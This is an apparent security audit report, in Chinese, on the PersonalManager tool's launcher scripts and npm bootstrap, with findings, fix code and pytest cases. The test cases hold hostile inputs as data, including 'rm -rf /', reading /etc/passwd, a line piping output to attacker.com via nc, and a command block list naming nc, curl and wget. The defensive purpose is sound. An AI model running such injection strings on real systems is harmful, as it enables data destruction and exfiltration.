# PersonalManager 安全审查报告

**审查日期**: 2025-09-14
**审查范围**: bin/pm-local、pm-wrapper.sh、CommandExecutor 及相关组件
**审查级别**: 全面安全审查

## 执行摘要

经过全面的安全审查，发现了多个需要关注的安全问题，其中包括 **2个关键级别**、**3个高风险级别**、**4个中等风险级别** 和 **3个低风险级别** 的安全问题。

## 详细发现

### 🔴 关键级别 (Critical)

#### 1. 命令注入风险 - subprocess.run() 不安全使用
**位置**: `/Users/sheldonzhao/programs/personal-manager/src/pm/agents/gtd_agent.py:373-374`
```python
result = subprocess.run(['ping', '-c', '1', '8.8.8.8'],
                       capture_output=True, timeout=3)
```

**描述**: 虽然当前使用了列表形式的参数传递，但没有输入验证和参数清理机制。

**影响**: 如果后续代码修改允许用户输入作为命令参数，可能导致命令注入攻击。

**修复建议**:
```python
import shlex
import subprocess

def safe_ping(target='8.8.8.8'):
    # 验证目标地址
    import ipaddress
    try:
        ipaddress.ip_address(target)
    except ValueError:
        raise ValueError(f"Invalid IP address: {target}")

    # 使用白名单命令
    cmd = ['ping', '-c', '1', target]
    result = subprocess.run(
        cmd,
        capture_output=True,
        timeout=3,
        check=False,  # 不抛出异常
        text=True,
        env={'PATH': '/usr/bin:/bin'}  # 限制 PATH
    )
    return result.returncode == 0
```

#### 2. npm 包中的命令执行风险
**位置**: `/Users/sheldonzhao/programs/personal-manager/npm/pm-bootstrap/bin/pm-bootstrap.js:35-39`
```javascript
const result = execSync(command, {
    encoding: 'utf8',
    stdio: this.verbose ? 'inherit' : 'pipe',
    ...options
});
```

**描述**: execSync 直接执行传入的命令字符串，存在命令注入风险。

**影响**: 恶意用户可以通过精心构造的输入执行任意系统命令。

**修复建议**:
```javascript
const { spawn } = require('child_process');

async execCommand(args, options = {}) {
    // 使用 spawn 替代 execSync
    const [cmd, ...cmdArgs] = args;

    // 白名单验证
    const allowedCommands = ['python', 'python3', 'pip', 'pipx', 'git'];
    if (!allowedCommands.includes(cmd)) {
        throw new Error(`Command not allowed: ${cmd}`);
    }

    return new Promise((resolve, reject) => {
        const proc = spawn(cmd, cmdArgs, {
            ...options,
            shell: false  // 禁用 shell
        });

        let stdout = '';
        let stderr = '';

        proc.stdout.on('data', (data) => stdout += data);
        proc.stderr.on('data', (data) => stderr += data);

        proc.on('close', (code) => {
            if (code === 0) {
                resolve({ success: true, output: stdout });
            } else {
                resolve({ success: false, error: stderr, output: stdout });
            }
        });
    });
}
```

### 🟠 高风险 (High)

#### 3. 路径遍历潜在风险
**位置**: `/Users/sheldonzhao/programs/personal-manager/bin/pm-local:17-18`
```bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
```

**描述**: 路径构建没有验证，可能被符号链接或路径遍历攻击利用。

**影响**: 攻击者可能通过符号链接导致脚本在非预期目录执行。

**修复建议**:
```bash
# 使用 readlink 解析实际路径
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# 验证路径有效性
if [[ ! -d "$PROJECT_ROOT/src/pm" ]]; then
    echo "Error: Invalid project structure detected" >&2
    exit 1
fi

# 防止路径遍历
PROJECT_ROOT="$(realpath "$PROJECT_ROOT")"
if [[ "$PROJECT_ROOT" == *".."* ]]; then
    echo "Error: Path traversal detected" >&2
    exit 1
fi
```

#### 4. exec 使用不当导致的进程替换风险
**位置**: `/Users/sheldonzhao/programs/personal-manager/bin/pm-local:69,87`
```bash
exec poetry run pm "$@"
exec python3 -m pm.cli.main "$@"
```

**描述**: 使用 exec 直接替换当前进程，未保留原始环境和安全上下文。

**影响**: 可能导致环境变量泄露或进程权限提升。

**修复建议**:
```bash
# 清理敏感环境变量
unset AWS_SECRET_ACCESS_KEY
unset DATABASE_PASSWORD
unset API_TOKEN

# 设置安全环境
export PYTHONDONTWRITEBYTECODE=1
export PYTHONHASHSEED=random

# 使用受限的 PATH
export PATH="/usr/local/bin:/usr/bin:/bin"

# 添加超时保护
timeout 300 poetry run pm "$@" || {
    echo "Command timed out" >&2
    exit 124
}
```

#### 5. 缺少输入验证的参数传递
**位置**: 整个 `pm-local` 脚本中的 `"$@"` 使用

**描述**: 直接传递所有参数而不进行验证或清理。

**影响**: 可能传递恶意参数导致下游命令执行非预期操作。

**修复建议**:
```bash
# 参数验证函数
validate_args() {
    for arg in "$@"; do
        # 检查危险字符
        if [[ "$arg" =~ [;\|&\$\`] ]]; then
            echo "Error: Invalid character in argument: $arg" >&2
            exit 1
        fi

        # 检查参数长度
        if [[ ${#arg} -gt 1000 ]]; then
            echo "Error: Argument too long" >&2
            exit 1
        fi
    done
}

# 在传递参数前验证
validate_args "$@"
```

### 🟡 中等风险 (Medium)

#### 6. 环境变量注入风险
**位置**: `/Users/sheldonzhao/programs/personal-manager/bin/pm-local:86`
```bash
export PYTHONPATH="$PROJECT_ROOT/src"
```

**描述**: 直接设置 PYTHONPATH 可能被恶意代码利用。

**修复建议**:
```bash
# 验证并清理 PYTHONPATH
if [[ -n "$PYTHONPATH" ]]; then
    echo "Warning: Existing PYTHONPATH will be overridden" >&2
fi

# 使用绝对路径并验证
SAFE_PYTHONPATH="$(realpath "$PROJECT_ROOT/src")"
if [[ -d "$SAFE_PYTHONPATH" ]]; then
    export PYTHONPATH="$SAFE_PYTHONPATH"
else
    echo "Error: Source directory not found" >&2
    exit 1
fi
```

#### 7. 日志信息泄露
**位置**: 各个日志输出点

**描述**: 错误消息可能泄露系统路径和配置信息。

**修复建议**:
```bash
# 使用安全的错误处理
safe_error() {
    local msg="$1"
    # 移除敏感路径信息
    msg="${msg//$HOME/\~}"
    msg="${msg//$USER/[user]}"
    echo "Error: $msg" >&2
}
```

#### 8. 超时处理不足
**位置**: `subprocess.run` 调用

**描述**: 仅有 3 秒超时，某些情况下可能不够或过长。

**修复建议**:
```python
import signal
import subprocess

def run_with_timeout(cmd, timeout=5):
    def timeout_handler(signum, frame):
        raise TimeoutError(f"Command timed out after {timeout} seconds")

    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        signal.alarm(0)  # 取消超时
        return result
    except TimeoutError:
        signal.alarm(0)
        raise
```

#### 9. Git URL 验证不足
**位置**: `pm-bootstrap.js:134`

**描述**: 直接使用 Git URL 而不验证其安全性。

**修复建议**:
```javascript
function validateGitUrl(url) {
    const allowedHosts = ['github.com', 'gitlab.com'];
    const parsed = new URL(url);

    if (!allowedHosts.includes(parsed.hostname)) {
        throw new Error(`Untrusted Git host: ${parsed.hostname}`);
    }

    // 检查协议
    if (!['https:', 'git:'].includes(parsed.protocol)) {
        throw new Error(`Unsafe protocol: ${parsed.protocol}`);
    }

    return true;
}
```

### 🟢 低风险 (Low)

#### 10. 颜色代码可能导致终端注入
**位置**: `pm-local:24-28`

**描述**: ANSI 转义序列如果不当使用可能导致终端控制序列注入。

**修复建议**:
```bash
# 检查是否支持颜色输出
if [[ -t 1 ]] && [[ "$(tput colors)" -ge 8 ]]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    # ...
else
    RED=''
    GREEN=''
    # ...
fi
```

#### 11. 权限检查不足
**位置**: 整个系统

**描述**: 没有明确的权限检查机制。

**修复建议**:
```bash
# 检查脚本权限
if [[ ! -r "$SCRIPT_DIR/pm-local" ]]; then
    echo "Error: Insufficient permissions" >&2
    exit 1
fi

# 确保不以 root 运行
if [[ $EUID -eq 0 ]]; then
    echo "Error: This script should not be run as root" >&2
    exit 1
fi
```

#### 12. 缺少完整性校验
**位置**: 整个安装过程

**描述**: 没有对下载或安装的文件进行完整性校验。

**修复建议**:
```javascript
const crypto = require('crypto');

function verifyChecksum(filePath, expectedHash) {
    const fileBuffer = fs.readFileSync(filePath);
    const hashSum = crypto.createHash('sha256');
    hashSum.update(fileBuffer);
    const hex = hashSum.digest('hex');

    if (hex !== expectedHash) {
        throw new Error('Checksum verification failed');
    }
}
```

## 测试用例要求

### Critical 级别测试用例（必须实现）

```python
# test_security_critical.py
import pytest
import subprocess
from unittest.mock import patch, MagicMock

class TestCommandInjectionPrevention:
    """测试命令注入防护"""

    def test_subprocess_with_shell_false(self):
        """确保 subprocess 调用禁用 shell"""
        with patch('subprocess.run') as mock_run:
            # 测试代码调用
            from pm.agents.gtd_agent import GTDAgent
            agent = GTDAgent()
            agent.detect_current_context()

            # 验证 shell=False 或未设置 shell
            for call in mock_run.call_args_list:
                kwargs = call.kwargs
                assert kwargs.get('shell', False) == False

    def test_ping_command_validation(self):
        """测试 ping 命令参数验证"""
        dangerous_inputs = [
            "8.8.8.8; rm -rf /",
            "8.8.8.8 && cat /etc/passwd",
            "8.8.8.8 | nc attacker.com 1234",
            "$(whoami)",
            "`id`",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises((ValueError, subprocess.CalledProcessError)):
                # 应该拒绝执行危险输入
                safe_ping(dangerous_input)

    def test_path_traversal_prevention(self):
        """测试路径遍历防护"""
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "~/../../../etc/passwd",
            "${HOME}/../../../etc/passwd",
        ]

        for path in dangerous_paths:
            # 应该拒绝访问系统文件
            assert not is_safe_path(path)

    def test_exec_command_whitelist(self):
        """测试命令白名单机制"""
        allowed = ['pm', 'python3', 'poetry']
        blocked = ['rm', 'cat', 'nc', 'curl', 'wget']

        for cmd in allowed:
            assert is_command_allowed(cmd)

        for cmd in blocked:
            assert not is_command_allowed(cmd)

class TestEnvironmentSecurity:
    """测试环境变量安全"""

    def test_sensitive_env_vars_cleaned(self):
        """测试敏感环境变量被清理"""
        sensitive_vars = [
            'AWS_SECRET_ACCESS_KEY',
            'DATABASE_PASSWORD',
            'API_TOKEN',
            'GITHUB_TOKEN',
        ]

        # 运行 pm-local 脚本
        result = subprocess.run(
            ['./bin/pm-local', '--launcher-debug'],
            capture_output=True,
            text=True,
            env={**os.environ, 'AWS_SECRET_ACCESS_KEY': 'secret'}
        )

        # 验证敏感信息不在输出中
        for var in sensitive_vars:
            assert var not in result.stdout
            assert 'secret' not in result.stdout
```

## 修复优先级

1. **立即修复 (P0)**
   - 命令注入风险
   - npm 包中的 execSync 使用

2. **24小时内修复 (P1)**
   - 路径遍历风险
   - exec 进程替换问题
   - 输入验证缺失

3. **一周内修复 (P2)**
   - 环境变量注入
   - 日志信息泄露
   - 超时处理
   - Git URL 验证

4. **计划修复 (P3)**
   - 终端注入防护
   - 权限检查
   - 完整性校验

## 安全加固建议

### 1. 实施防御性编程
```python
# 安全包装器示例
class SecureCommandExecutor:
    ALLOWED_COMMANDS = {'pm', 'python3', 'poetry'}

    def execute(self, command, args=None):
        if command not in self.ALLOWED_COMMANDS:
            raise SecurityError(f"Command not allowed: {command}")

        # 参数清理
        safe_args = self._sanitize_args(args or [])

        # 使用 subprocess 安全执行
        return subprocess.run(
            [command] + safe_args,
            capture_output=True,
            text=True,
            shell=False,
            timeout=30,
            env=self._get_safe_env()
        )
```

### 2. 添加安全监控
```python
import logging
from datetime import datetime

class SecurityAuditor:
    def log_command_execution(self, command, user, timestamp):
        logging.warning(
            f"SECURITY_AUDIT: Command execution",
            extra={
                'command': command,
                'user': user,
                'timestamp': timestamp,
                'action': 'COMMAND_EXEC'
            }
        )
```

### 3. 实施最小权限原则
```bash
# 创建专用用户运行
useradd -r -s /bin/false pm-runner

# 设置严格的文件权限
chmod 755 /path/to/pm-local
chmod 644 /path/to/config/files
```

## 合规性检查清单

- [ ] 所有 subprocess 调用使用 shell=False
- [ ] 所有用户输入经过验证和清理
- [ ] 敏感信息不出现在日志中
- [ ] 实施了命令白名单机制
- [ ] 路径遍历防护已到位
- [ ] 超时机制已实施
- [ ] 权限检查已实施
- [ ] 安全测试用例已通过

## 总结

本次安全审查发现了多个需要立即关注的安全问题。建议按照优先级逐步修复，并实施建议的安全加固措施。所有 Critical 级别的问题必须在生产部署前修复并通过相应的测试用例验证。

---

**审查人**: Security Auditor
**审查工具**: Static Analysis + Manual Review
**下次审查日期**: 2025-10-14